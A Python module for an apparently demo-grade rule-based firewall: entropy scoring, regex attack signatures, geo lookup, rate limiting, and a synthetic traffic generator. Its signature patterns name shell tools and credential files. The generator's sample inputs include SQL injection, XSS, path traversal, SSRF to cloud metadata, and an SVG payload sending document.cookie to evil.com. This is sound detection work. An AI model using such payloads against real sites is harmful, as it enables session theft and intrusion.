"""Next-Gen Firewall v2 — heuristic/rule-based DPI (entropy + pattern signatures), geo-intelligence, real-time traffic analysis.

Despite the historical "ml_"-prefixed names below (ml_score, ml_category,
_ml_threat_score, kept as-is since they're part of the persisted
traffic_log shape and API response consumed elsewhere), scoring is
deterministic rule-based heuristics (Shannon entropy, character-class
density, regex signature matches) — no trained model. See commit
512307e/7eab737 for the same correction applied to this module's
user-facing labels; this docstring update extends it to the module's own
internal documentation.
"""
import re
import math
import json
import time
import hashlib
import random
import logging
import ipaddress
from collections import defaultdict, deque
from datetime import datetime, timedelta
from typing import Dict, List, Optional, Tuple
from pathlib import Path

from modules.osint.geo_intel import geolocate_ip

logger = logging.getLogger(__name__)

DATA_FILE = Path("data/ngfw_v2_state.json")
GEO_CACHE_FILE = Path("data/ngfw_geo_cache.json")
GEO_CACHE_TTL = 12 * 3600  # same TTL as modules/threat_intel/global_feed.py's geo cache

# Sliding-window limiter on live geo lookups so a DPI traffic burst can't
# blow through ip-api.com's free-tier ~45 req/min cap.
_GEO_RATE_WINDOW = 60
_GEO_RATE_MAX = 40
_geo_call_times: deque = deque()

# ── Protocol / Port Intelligence ───────────────────────────────────────────────

KNOWN_PORTS = {
    20: "FTP-Data",    21: "FTP",       22: "SSH",      23: "Telnet",
    25: "SMTP",        53: "DNS",       80: "HTTP",     110: "POP3",
    143: "IMAP",       443: "HTTPS",    465: "SMTPS",   587: "SMTP-TLS",
    636: "LDAPS",      989: "FTPS",     993: "IMAPS",   995: "POP3S",
    1080: "SOCKS5",    1194: "OpenVPN", 1433: "MSSQL",  1521: "Oracle",
    3306: "MySQL",     3389: "RDP",     4444: "Meterpreter",
    5432: "PostgreSQL",5900: "VNC",     6379: "Redis",  6667: "IRC",
    8080: "HTTP-Alt",  8443: "HTTPS-Alt",8888: "Alt",   9200: "Elasticsearch",
    27017: "MongoDB",  31337: "Elite",  4545: "C2-Common", 8888: "Jupyter",
}

SUSPICIOUS_PORTS = {4444, 4545, 31337, 6667, 1080, 9999, 12345, 54321, 8888}

HIGH_RISK_COUNTRY_CODES = {
    "KP": "North Korea", "IR": "Iran", "RU": "Russia (sanctioned IPs)",
    "CN": "China (high-risk ASNs)", "SY": "Syria", "CU": "Cuba",
}

# ── Heuristic Feature Extractors (entropy/pattern-based, not ML) ──────────────

def _shannon_entropy(data: str) -> float:
    if not data:
        return 0.0
    freq = defaultdict(int)
    for c in data:
        freq[c] += 1
    length = len(data)
    return -sum((f / length) * math.log2(f / length) for f in freq.values())


def _extract_ml_features(payload: str, headers: dict, method: str, path: str) -> dict:
    payload_len = len(payload)
    header_count = len(headers)
    path_depth = path.count("/")
    param_count = path.count("&") + path.count("?")
    entropy = _shannon_entropy(payload + path)
    special_chars = sum(1 for c in payload + path if c in "';\"<>(){}[]|&$`\\")
    non_ascii = sum(1 for c in payload if ord(c) > 127)
    hex_encoded = len(re.findall(r'%[0-9a-fA-F]{2}', path + payload))
    double_encoded = len(re.findall(r'%25[0-9a-fA-F]{2}', path + payload))
    sql_keywords = len(re.findall(r'\b(?:SELECT|UNION|INSERT|DROP|UPDATE|DELETE|EXEC|CAST|CONVERT)\b', payload + path, re.I))
    script_tags = len(re.findall(r'<script|javascript:|onerror=|onload=', payload + path, re.I))

    return {
        "payload_length": payload_len,
        "header_count": header_count,
        "path_depth": path_depth,
        "param_count": param_count,
        "entropy": round(entropy, 3),
        "special_char_density": round(special_chars / max(payload_len + len(path), 1), 3),
        "non_ascii_ratio": round(non_ascii / max(payload_len, 1), 3),
        "hex_encoding_count": hex_encoded,
        "double_encoding_count": double_encoded,
        "sql_keyword_count": sql_keywords,
        "script_injection_count": script_tags,
    }


def _ml_threat_score(features: dict) -> Tuple[float, str]:
    """Compute a 0-100 heuristic (rule-based, not ML) threat score and category."""
    score = 0.0

    if features["entropy"] > 4.5:
        score += 20
    if features["special_char_density"] > 0.1:
        score += 15
    if features["double_encoding_count"] > 0:
        score += 25
    if features["hex_encoding_count"] > 5:
        score += 10
    if features["sql_keyword_count"] > 0:
        score += features["sql_keyword_count"] * 15
    if features["script_injection_count"] > 0:
        score += features["script_injection_count"] * 20
    if features["non_ascii_ratio"] > 0.3:
        score += 10
    if features["param_count"] > 10:
        score += 5
    if features["payload_length"] > 2000:
        score += 8

    score = min(100.0, score)

    if score >= 80:
        category = "ATTACK"
    elif score >= 60:
        category = "SUSPICIOUS"
    elif score >= 35:
        category = "ANOMALY"
    else:
        category = "BENIGN"

    return round(score, 1), category


# ── Deep Packet Inspection Engine ─────────────────────────────────────────────

DPI_SIGNATURES = [
    # SQL Injection
    {"id": "DPI-SQL-001", "name": "UNION SELECT", "pattern": r"(?i)\bunion\b[\s/\*]+(?:all\s+)?select\b",
     "category": "sqli", "severity": "CRITICAL", "confidence_base": 95},
    {"id": "DPI-SQL-002", "name": "Boolean Blind SQLi", "pattern": r"(?i)\bor\b\s+[\d'\"]+\s*=\s*[\d'\"]+",
     "category": "sqli", "severity": "CRITICAL", "confidence_base": 90},
    {"id": "DPI-SQL-003", "name": "Time-Based SQLi", "pattern": r"(?i)(?:sleep\s*\(|waitfor\s+delay|benchmark\s*\(|pg_sleep)",
     "category": "sqli", "severity": "CRITICAL", "confidence_base": 95},
    {"id": "DPI-SQL-004", "name": "SQL EXEC", "pattern": r"(?i)\bexec(?:ute)?\s*\(",
     "category": "sqli", "severity": "HIGH", "confidence_base": 85},
    # XSS
    {"id": "DPI-XSS-001", "name": "Script Tag", "pattern": r"(?i)<\s*script[^>]*>",
     "category": "xss", "severity": "HIGH", "confidence_base": 92},
    {"id": "DPI-XSS-002", "name": "Event Handler", "pattern": r"(?i)\bon(?:error|load|click|mouseover|focus|blur)\s*=",
     "category": "xss", "severity": "HIGH", "confidence_base": 88},
    {"id": "DPI-XSS-003", "name": "JavaScript URI", "pattern": r"(?i)javascript\s*:",
     "category": "xss", "severity": "HIGH", "confidence_base": 90},
    {"id": "DPI-XSS-004", "name": "SVG XSS", "pattern": r"(?i)<\s*svg[^>]*onload",
     "category": "xss", "severity": "HIGH", "confidence_base": 93},
    # Path Traversal / LFI
    {"id": "DPI-LFI-001", "name": "Directory Traversal", "pattern": r"(?:\.\.[\\/]){2,}",
     "category": "lfi", "severity": "HIGH", "confidence_base": 88},
    {"id": "DPI-LFI-002", "name": "PHP Wrapper", "pattern": r"(?i)php://(?:filter|input|data|fd)",
     "category": "lfi", "severity": "CRITICAL", "confidence_base": 95},
    {"id": "DPI-LFI-003", "name": "Sensitive File Access", "pattern": r"(?:/etc/(?:passwd|shadow|hosts)|/proc/self/environ|\.env|web\.config)",
     "category": "lfi", "severity": "CRITICAL", "confidence_base": 95},
    # Command Injection
    {"id": "DPI-CMD-001", "name": "Shell Pipe", "pattern": r"[|;&`]\s*(?:id|whoami|uname|cat|ls|wget|curl|bash|sh)\b",
     "category": "cmdi", "severity": "CRITICAL", "confidence_base": 92},
    {"id": "DPI-CMD-002", "name": "Command Substitution", "pattern": r"\$\([^)]+\)|`[^`]+`",
     "category": "cmdi", "severity": "HIGH", "confidence_base": 80},
    # SSRF
    {"id": "DPI-SSRF-001", "name": "Cloud Metadata", "pattern": r"169\.254\.169\.254|metadata\.google\.internal|100\.100\.100\.200",
     "category": "ssrf", "severity": "CRITICAL", "confidence_base": 99},
    {"id": "DPI-SSRF-002", "name": "SSRF Protocol", "pattern": r"(?i)(?:dict|gopher|file|ftp)://",
     "category": "ssrf", "severity": "HIGH", "confidence_base": 85},
    # C2 Beaconing
    {"id": "DPI-C2-001", "name": "Cobalt Strike Beacon", "pattern": r"(?:MZARUH|Content-Type: application/octet-stream\r\n\r\n.{4}AAAA)",
     "category": "c2", "severity": "CRITICAL", "confidence_base": 97},
    {"id": "DPI-C2-002", "name": "Encoded Payload Transfer", "pattern": r"(?:[A-Za-z0-9+/]{40,}={0,2}){3,}",
     "category": "c2", "severity": "MEDIUM", "confidence_base": 60},
    # Protocol Anomalies
    {"id": "DPI-PROTO-001", "name": "HTTP Method Tampering", "pattern": r"^(?:TRACE|TRACK|CONNECT|PROPFIND|PROPPATCH|MKCOL|COPY|MOVE|LOCK|UNLOCK)\b",
     "category": "protocol", "severity": "MEDIUM", "confidence_base": 70},
    # Encoding attacks
    {"id": "DPI-ENC-001", "name": "Double URL Encoding", "pattern": r"%25(?:2[0-9a-fA-F]|3[0-9a-dA-D])",
     "category": "evasion", "severity": "HIGH", "confidence_base": 85},
    {"id": "DPI-ENC-002", "name": "Null Byte Injection", "pattern": r"%00|\x00",
     "category": "evasion", "severity": "HIGH", "confidence_base": 90},
]


def _is_private_ip(ip: str) -> bool:
    try:
        addr = ipaddress.ip_address(ip)
    except ValueError:
        return False
    return addr.is_private or addr.is_loopback or addr.is_link_local


def _load_geo_cache() -> dict:
    if GEO_CACHE_FILE.exists():
        try:
            return json.loads(GEO_CACHE_FILE.read_text())
        except Exception:
            pass
    return {}


def _save_geo_cache(cache: dict) -> None:
    try:
        GEO_CACHE_FILE.parent.mkdir(parents=True, exist_ok=True)
        GEO_CACHE_FILE.write_text(json.dumps(cache))
    except Exception:
        logger.warning("failed to persist NGFW geo cache", exc_info=True)


_UNKNOWN_GEO = {"country": "Unknown", "country_code": "??", "is_high_risk": False, "risk_reason": ""}


async def _geo_lookup(ip: str) -> dict:
    """Real geo lookup via modules.osint.geo_intel (ip-api.com, with an
    ipinfo.io fallback -- the same provider Threat Map uses), backed by a
    TTL disk cache so repeated DPI hits from the same source IP don't
    re-query the provider, and a sliding-window limiter so a traffic burst
    can't blow through ip-api.com's free-tier rate limit. Private/loopback/
    link-local source IPs are classified locally (no provider can
    geolocate an RFC1918 address anyway). Anything that can't be
    confidently geolocated -- private-but-unrecognized, provider failure,
    or the limiter is saturated -- gets an honest "Unknown", never a
    guess."""
    if _is_private_ip(ip):
        return {"country": "Internal Network", "country_code": "LAN", "is_high_risk": False, "risk_reason": ""}

    now = time.time()
    cache = _load_geo_cache()
    entry = cache.get(ip)
    if entry and now - entry.get("_cached_at", 0) < GEO_CACHE_TTL:
        return {k: v for k, v in entry.items() if k != "_cached_at"}

    while _geo_call_times and now - _geo_call_times[0] > _GEO_RATE_WINDOW:
        _geo_call_times.popleft()
    if len(_geo_call_times) >= _GEO_RATE_MAX:
        return dict(_UNKNOWN_GEO)
    _geo_call_times.append(now)

    try:
        geo = await geolocate_ip(ip)
    except Exception:
        logger.warning("geo lookup failed for %s", ip, exc_info=True)
        geo = None

    if not geo or geo.get("error") or not geo.get("country_code"):
        return dict(_UNKNOWN_GEO)

    code = geo["country_code"]
    result = {
        "country": geo.get("country") or "Unknown",
        "country_code": code,
        "is_high_risk": code in HIGH_RISK_COUNTRY_CODES,
        "risk_reason": HIGH_RISK_COUNTRY_CODES.get(code, ""),
    }
    cache[ip] = {**result, "_cached_at": now}
    _save_geo_cache(cache)
    return result


# ── Rate Limiting ─────────────────────────────────────────────────────────────

_rate_buckets: Dict[str, deque] = defaultdict(deque)
_blocked_ips: Dict[str, datetime] = {}

def _check_rate_limit(ip: str, window: int = 60, max_req: int = 100) -> dict:
    now = time.time()
    bucket = _rate_buckets[ip]
    while bucket and now - bucket[0] > window:
        bucket.popleft()
    bucket.append(now)
    rate = len(bucket)
    if rate > max_req:
        _blocked_ips[ip] = datetime.utcnow()
    return {
        "ip": ip,
        "requests_in_window": rate,
        "limit": max_req,
        "window_seconds": window,
        "blocked": rate > max_req,
        "current_rps": round(rate / window, 2),
    }


# ── State persistence ──────────────────────────────────────────────────────────

def _load_state() -> dict:
    DATA_FILE.parent.mkdir(parents=True, exist_ok=True)
    if DATA_FILE.exists():
        try:
            return json.loads(DATA_FILE.read_text())
        except Exception:
            pass
    return {"traffic_log": [], "blocked_ips": [], "stats": {"total": 0, "blocked": 0, "anomalies": 0}}


def _save_state(state: dict) -> None:
    DATA_FILE.parent.mkdir(parents=True, exist_ok=True)
    DATA_FILE.write_text(json.dumps(state, indent=2, default=str))


# ── Main Inspection Engine ────────────────────────────────────────────────────

async def deep_inspect(
    method: str,
    path: str,
    headers: dict,
    body: str,
    src_ip: str,
    dst_port: int = 80,
    protocol: str = "HTTP",
    user_id: Optional[int] = None,
) -> dict:
    """Full DPI + heuristic analysis of an incoming request/packet."""
    combined = f"{method} {path} {body}"
    features = _extract_ml_features(body, headers, method, path)
    ml_score, ml_category = _ml_threat_score(features)

    # Signature scanning
    sig_hits = []
    for sig in DPI_SIGNATURES:
        if re.search(sig["pattern"], combined, re.IGNORECASE | re.DOTALL):
            confidence = min(100, sig["confidence_base"] + (ml_score * 0.05))
            sig_hits.append({
                "id": sig["id"],
                "name": sig["name"],
                "category": sig["category"],
                "severity": sig["severity"],
                "confidence": round(confidence, 1),
            })

    # Geo check
    geo = await _geo_lookup(src_ip)

    # Rate limit
    rate = _check_rate_limit(src_ip)

    # Port risk
    port_name = KNOWN_PORTS.get(dst_port, f"Unknown-{dst_port}")
    port_suspicious = dst_port in SUSPICIOUS_PORTS

    # Protocol anomaly detection
    user_agent = headers.get("user-agent", headers.get("User-Agent", ""))
    ua_suspicious = bool(re.search(r"(?i)(?:sqlmap|nikto|nmap|masscan|zgrab|shodan|dirbuster|gobuster|ffuf)", user_agent))

    # Compute final decision
    final_score = ml_score
    if sig_hits:
        max_sig_sev = max(["LOW","MEDIUM","HIGH","CRITICAL"].index(s["severity"]) for s in sig_hits)
        final_score = min(100, final_score + max_sig_sev * 15)
    if geo["is_high_risk"]:
        final_score = min(100, final_score + 15)
    if rate["blocked"]:
        final_score = min(100, final_score + 30)
    if ua_suspicious:
        final_score = min(100, final_score + 25)
    if port_suspicious:
        final_score = min(100, final_score + 20)

    action = "BLOCK" if final_score >= 70 else "ALERT" if final_score >= 40 else "ALLOW"

    result = {
        "timestamp": datetime.utcnow().isoformat(),
        "src_ip": src_ip,
        "dst_port": dst_port,
        "port_name": port_name,
        "protocol": protocol,
        "method": method,
        "path": path[:200],
        "threat_score": round(final_score, 1),
        "ml_score": ml_score,
        "ml_category": ml_category,
        "action": action,
        "signature_hits": sig_hits,
        "ml_features": features,
        "geo": geo,
        "rate_limit": rate,
        "ua_suspicious": ua_suspicious,
        "user_agent": user_agent[:100],
        "port_suspicious": port_suspicious,
        "blocked": action == "BLOCK",
        "top_threat": sig_hits[0]["name"] if sig_hits else ml_category,
        "user_id": user_id,
    }

    # Persist
    state = _load_state()
    state["traffic_log"].insert(0, result)
    state["traffic_log"] = state["traffic_log"][:1000]
    state["stats"]["total"] += 1
    if action == "BLOCK":
        state["stats"]["blocked"] += 1
    if action in ("ALERT", "BLOCK"):
        state["stats"]["anomalies"] += 1
    _save_state(state)

    return result


def get_traffic_stats(user_id: Optional[int] = None, is_admin: bool = False) -> dict:
    """`totals`/`category_breakdown`/`top_source_ips`/`geo_distribution`/
    `blocked_ips` stay computed from every account's traffic (install-wide
    firewall telemetry, same category as honeypot/threat-feed's global
    stores). `recent_log`, though, is the raw path/body/user-agent content
    a specific account submitted to POST /api/inspect -- scoped to
    `user_id`'s own entries (admin sees every account's -- same
    admin-sees-all convention used elsewhere in this audit series), so one
    customer's test payloads aren't visible to another."""
    state = _load_state()
    log = state["traffic_log"]
    stats = state["stats"]

    # Category breakdown
    categories = defaultdict(int)
    for entry in log:
        for hit in entry.get("signature_hits", []):
            categories[hit["category"]] += 1

    # Top source IPs
    ip_counts = defaultdict(int)
    for entry in log:
        ip_counts[entry["src_ip"]] += 1
    top_ips = sorted(ip_counts.items(), key=lambda x: x[1], reverse=True)[:10]

    # Geo distribution
    geo_counts = defaultdict(int)
    for entry in log:
        cc = entry.get("geo", {}).get("country_code", "??")
        geo_counts[cc] += 1

    own_log = log if (is_admin or user_id is None) else [e for e in log if e.get("user_id") == user_id]

    return {
        "totals": stats,
        "recent_log": own_log[:20],
        "category_breakdown": dict(categories),
        "top_source_ips": [{"ip": ip, "count": cnt} for ip, cnt in top_ips],
        "geo_distribution": dict(geo_counts),
        "blocked_ips": list(_blocked_ips.keys())[:20],
        "dpi_rules_count": len(DPI_SIGNATURES),
    }


# simulate_traffic_burst() below generates synthetic demo traffic (randomly
# sampled IPs, paths and bodies) and runs it through the REAL DPI signature
# engine and heuristic entropy scorer (deep_inspect(), untouched — same 30+
# regex signatures and Shannon-entropy-based scoring used for genuine
# traffic). Only the traffic being analyzed is fabricated, not the
# detection logic. Because deep_inspect() persists every result (real or
# simulated) into the same shared traffic_log, results produced here are
# tagged simulated=True + a bilingual note — after the fact, not inside
# deep_inspect() itself, so real traffic stays untagged — following the
# `_ar`-suffixed bilingual convention used elsewhere in the project (see
# modules/darkweb/intelligence.py and
# app/services/recon/recon_engine.py's SIMULATED_NOTE_EN/AR).
SIMULATED_NOTE_EN = (
    "Simulated data — this traffic burst is synthetic demo input (randomly "
    "sampled source IPs, request paths and bodies), not real network traffic. "
    "It is scored by the same real DPI signature engine and heuristic entropy "
    "scorer used for live traffic (deep_inspect), but the traffic itself is "
    "fabricated for visualization/demo purposes only."
)
SIMULATED_NOTE_AR = (
    "بيانات محاكاة — دفعة الحركة هذه إدخال تجريبي اصطناعي (عناوين IP مصدر "
    "ومسارات طلبات ونصوص عشوائية)، وليست حركة شبكة حقيقية. تُقيَّم بواسطة نفس "
    "محرك توقيعات الفحص العميق الحقيقي ومحرك تسجيل الإنتروبيا الاستدلالي المستخدم "
    "للحركة الحية (deep_inspect)، لكن الحركة نفسها مُصطنعة لأغراض العرض التوضيحي فقط."
)


async def simulate_traffic_burst(n: int = 20) -> List[dict]:
    """Generate simulated traffic for visualization/demo."""
    results = []
    sample_ips = [
        "185.234.216.45", "45.142.212.100", "103.43.75.1", "91.108.4.10",
        "62.75.154.99", "192.168.1.100", "10.0.0.50", "58.220.1.1",
        "178.250.240.10", "5.188.206.14", "192.0.2.1", "203.0.113.42",
    ]
    sample_paths = [
        "/api/users?id=1' OR '1'='1",
        "/login",
        "/api/products",
        "/?q=<script>alert(1)</script>",
        "/include?file=../../../../etc/passwd",
        "/fetch?url=http://169.254.169.254/latest/meta-data/",
        "/api/data",
        "/search?q=normal+query",
        "/admin/dashboard",
        "/api/health",
    ]
    sample_bodies = [
        "username=admin&password=admin",
        "data=' UNION SELECT username,password FROM users--",
        "{}",
        "<svg onload=fetch('http://evil.com/'+document.cookie)>",
        "",
        "url=gopher://127.0.0.1:6379/INFO",
        '{"name": "test"}',
        "",
    ]

    for i in range(min(n, 50)):
        ip = random.choice(sample_ips)
        path = random.choice(sample_paths)
        body = random.choice(sample_bodies)
        result = await deep_inspect(
            method=random.choice(["GET", "POST", "PUT"]),
            path=path,
            headers={"User-Agent": random.choice(["Mozilla/5.0", "sqlmap/1.7", "curl/7.68"])},
            body=body,
            src_ip=ip,
            dst_port=random.choice([80, 443, 8080, 3306, 4444]),
        )
        result["simulated"] = True
        result["note"] = SIMULATED_NOTE_EN
        result["note_ar"] = SIMULATED_NOTE_AR
        results.append(result)

    # deep_inspect() already persisted an untagged copy of each result into
    # the shared traffic_log (it always inserts at index 0). Tag those
    # persisted copies too so simulated entries stay marked wherever
    # get_traffic_stats()/the dashboard reads them back from disk.
    if results:
        state = _load_state()
        for i, r in enumerate(reversed(results)):
            if i < len(state["traffic_log"]):
                state["traffic_log"][i]["simulated"] = True
                state["traffic_log"][i]["note"] = SIMULATED_NOTE_EN
                state["traffic_log"][i]["note_ar"] = SIMULATED_NOTE_AR
        _save_state(state)

    return results


def get_geo_block_list() -> dict:
    return {
        "blocked_countries": HIGH_RISK_COUNTRY_CODES,
        "note": "Geo-blocking is advisory — configure enforcement at network perimeter (iptables/cloud WAF)",
    }
